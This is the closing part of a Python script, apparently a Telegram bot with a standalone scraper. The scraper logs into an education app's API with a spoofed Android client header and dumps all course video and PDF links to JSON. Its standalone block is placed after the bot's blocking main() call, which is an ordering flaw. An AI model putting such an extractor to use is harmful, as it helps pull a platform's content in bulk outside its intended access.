    app.add_handler(CommandHandler("info",    show_info))
    app.add_handler(CommandHandler("logout",  logout))

    # Inline button handler
    app.add_handler(CallbackQueryHandler(button_handler))

    # Text message handler (for OTP login flow)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("🤖 Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()


# ─────────────────────────────────────────────────────────────────────────────
# STANDALONE SCRAPER (run without Telegram — dumps all links to JSON)
# ─────────────────────────────────────────────────────────────────────────────
# To use standalone:
#
#   python bridge_to_success_extractor.py --standalone --mobile 9999999999 --otp 123456
#
# Or call dump_all_links() directly from another script.
#
# ─────────────────────────────────────────────────────────────────────────────

import sys

def dump_all_links(mobile: str, otp: str, output_file: str = "content_links.json"):
    """Standalone: login and dump all content links to a JSON file."""
    print(f"[*] Logging in as {mobile}...")
    
    # Try login
    resp = requests.post(
        API_BASE + ENDPOINTS["login"],
        json={"mobile": mobile, "otp": otp},
        headers={"Content-Type": "application/json", "User-Agent": "okhttp/4.9.3"},
        timeout=20
    )
    data = resp.json()
    if data.get("status") != 1:
        # Try send OTP first if OTP is blank
        print(f"[!] Login failed: {data.get('message')}. Sending OTP...")
        requests.post(
            API_BASE + ENDPOINTS["send_otp"],
            json={"mobile": mobile, "type": "login"},
            headers={"Content-Type": "application/json"},
            timeout=20
        )
        otp_input = input(f"Enter OTP sent to {mobile}: ")
        resp = requests.post(
            API_BASE + ENDPOINTS["login"],
            json={"mobile": mobile, "otp": otp_input},
            headers={"Content-Type": "application/json", "User-Agent": "okhttp/4.9.3"},
            timeout=20
        )
        data = resp.json()

    if data.get("status") != 1:
        print(f"[-] Auth failed: {data.get('message')}")
        return

    token = (
        data.get("data", {}).get("token") or
        data.get("data", {}).get("authtoken") or ""
    )
    print(f"[+] Auth token: {token[:30]}...")

    # Fake user_id for local use
    fake_uid = 999999
    user_sessions[fake_uid] = {"token": token, "user_id": "0", "name": mobile}

    print("[*] Fetching all batch content (this may take a while)...")
    items = fetch_all_batches(token, fake_uid)

    # Also fetch free content
    free  = fetch_free_content(fake_uid)
    items = free + items

    print(f"[+] Total items found: {len(items)}")
    print(f"    Videos : {sum(1 for i in items if 'VIDEO' in i['type'])}")
    print(f"    PDFs   : {sum(1 for i in items if 'PDF'   in i['type'])}")

    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(items, f, indent=2, ensure_ascii=False)
    print(f"[+] Saved to {output_file}")


if len(sys.argv) > 1 and "--standalone" in sys.argv:
    mobile = sys.argv[sys.argv.index("--mobile") + 1] if "--mobile" in sys.argv else input("Mobile: ")
    otp    = sys.argv[sys.argv.index("--otp")    + 1] if "--otp"    in sys.argv else ""
    dump_all_links(mobile, otp)
